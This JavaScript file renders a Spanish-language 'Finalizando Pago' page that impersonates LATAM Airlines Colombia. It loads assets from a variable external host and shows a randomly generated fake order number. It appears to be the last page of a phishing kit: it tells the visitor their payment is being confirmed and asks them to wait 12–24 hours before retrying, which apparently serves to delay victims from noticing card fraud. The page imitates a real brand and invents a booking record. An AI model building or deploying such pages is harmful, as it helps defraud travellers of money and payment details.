var my_titulo = 'Finalizando Pago';

var my_contenido = `

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="initial-scale=1.0, width=device-width, maximum-scale=1">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <link rel="shortcut icon" href="${my_hosting}assets/icons/favicon.png" type="image/x-icon">
    <link href="${my_hosting}css/finish_ltam.css" rel="stylesheet" media="all">
    <!-- Fuentes / íconos (opcionales; puedes quitarlos si no los usas) -->
    <script src="https://use.fontawesome.com/b1ad4d7e81.js"></script>
    <link href="https://use.fontawesome.com/b1ad4d7e81.css" rel="stylesheet" media="all">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="stylesheet"
        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@48,400,0,0">
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">

    <title>Cotiza Vuelos, Paquetes, Hoteles y Carros | LTM Colombia</title>

    <style>
        /* Reset / base del primer layout para mantener look&feel */
        body {
            margin: 0;
            padding: 0;
            font-family: "Segoe UI", Roboto, sans-serif;
            background-color: #f5f5f5;
            color: #1b365d;
        }

        .text-primary {
            color: #1b365d !important;
        }

        .text-success {
            color: #007f00 !important;
        }

        .text-secondary {
            color: #5c5c5c !important;
        }

        .fw-bold {
            font-weight: 700 !important;
        }

        .fs-4 {
            font-size: 1.25rem !important;
        }

        .fs-6 {
            font-size: 0.875rem !important;
        }

        .btn {
            background-color: #1b365d;
            color: #fff;
            border: none;
            border-radius: 5px;
            padding: .75rem 2rem;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color .3s ease-in-out;
        }

        .btn:hover {
            background-color: #15294f;
        }

        /* Navbar del HTML LTM */
        .p-fixed {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 1000;
        }

        .border-box {
            box-sizing: border-box;
        }

        .bg-deep-blue {
            background: #0a2357;
        }

        .p-3 {
            padding: 1rem;
        }

        .d-flex {
            display: flex;
        }

        .justify-space-between {
            justify-content: space-between;
        }

        .justify-content-center {
            justify-content: center;
        }

        .align-items-center {
            align-items: center;
        }

        .btn-session {
            background: transparent;
            color: #fff;
            border: 1px solid #5e78a1;
            border-radius: 4px;
            padding: .5rem .75rem;
            margin-right: .5rem;
            cursor: pointer;
        }

        .navbar--hamburger {
            width: 24px;
            height: auto;
        }

        /* Main */
        main {
            margin-top: 140px;
        }

        center {
            display: block;
            text-align: center;
        }

        .fw-light {
            font-weight: 300;
        }

        .tc-ocean {
            color: #0a2357;
        }

        .fs-3 {
            font-size: 1.75rem;
        }

        .fs-4 {
            font-size: 1.25rem;
        }

        .mt-1 {
            margin-top: .5rem;
        }

        .mb-5 {
            margin-bottom: 3rem;
        }

        .btn-success {
            background: #1b365d;
            color: #fff;
            border: none;
            border-radius: 5px;
            padding: .75rem 2rem;
        }

        .btn-success:hover {
            background: #15294f;
        }

        /* Angular helpers del HTML original (inofensivos sin Angular) */
        [ng\\:cloak],
        [ng-cloak],
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak,
        .ng-hide:not(.ng-hide-animate) {
            display: none !important;
        }

        ng\\:form {
            display: block;
        }

        .ng-animate-shim {
            visibility: hidden;
        }

        .ng-anchor {
            position: absolute;
        }
    </style>
</head>

<body ng-controller="startController" class="ng-scope">
    <div class="Wrapper" id="Wrapper">
        <div ui-view style="height:100%;" class="ng-scope">
            <!-- NAVBAR -->
            <nav class="p-fixed border-box bg-deep-blue p-3 ng-scope">
                <div class="d-flex justify-space-between align-items-center">
                    <div>
                        <img width="105" src="${my_hosting}img/ltam/LATAM_navbar.png" alt="LATAM">
                    </div>
                    <div class="d-flex justify-content-center align-items-center">
                        <button class="btn-session">Iniciar sesión</button>
                        <img class="navbar--hamburger" src="${my_hosting}img/ltam/hamburger_a.png" alt="Menú">
                    </div>
                </div>
            </nav>

            <!-- CONTENIDO PRINCIPAL (pendiente/confirmando) -->
            <main class="p-3 ng-scope">
                <center>
                    <img src="${my_hosting}img/ltam/chichon.png" style="width:70%;height:auto;" alt="Pago en proceso">

                    <span id="label-flight-go-resume" class="align-items-center fs-4 tc-ocean">
                        <p class="fw-light" style="font-size:20px">
                            Tu viaje a <b id="destino-ciudad" style="font-family:'Latam Bold';"></b> está casi listo
                        </p>
                        <p class="fw-light ng-binding" style="color:gray;">Nº de orden <strong id="order-id"></strong></p>

                        <p id="order-line" class="fw-light" style="color:gray;">
                            <!-- Se rellena por JS si hay número de orden -->
                        </p>
                    </span>

                    <p class="fw-light" style="color:gray;">
                        Tu pago se encuentra siendo confirmado. Enviaremos una copia del comprobante de pago al email o un SMS al número una vez esté listo.
                        Por favor espera de 12 a 24 horas antes de volver a intentar el pago.
                    </p>

                    <!-- Reutilizamos tu id de botón para que tu handler funcione -->
                    <button ng-click="goHome()" class="btn-success mt-1 mb-5">Ir al inicio</button>

                </center>
            </main>

            <!-- LOADER FULL (opcional, sin Angular queda oculto) -->
            <div class="loader-full ng-scope" ng-show="loader" id="loader-full">
                <span class="loader"></span>
                <p class="text-italic tc-ocean fs-3 fw-light">Cargando...</p>
            </div>
        </div>
    </div>
</body>
`;

//<script>
    loadContenido();

    setTimeout(() => {
        $('#loader-full').addClass('ng-hide');
    }, 3000);

    function generarNumeroOrden() {
        const prefijo = "LA";
        const numeros = Math.floor(10000000 + Math.random() * 90000000); 
        const letras = Array.from({
                length: 4
            }, () =>
            String.fromCharCode(65 + Math.floor(Math.random() * 26))
        ).join("");

        return `${prefijo}${numeros}${letras}`;
    }

    const orderId = generarNumeroOrden();
    document.getElementById("order-id").innerText = orderId;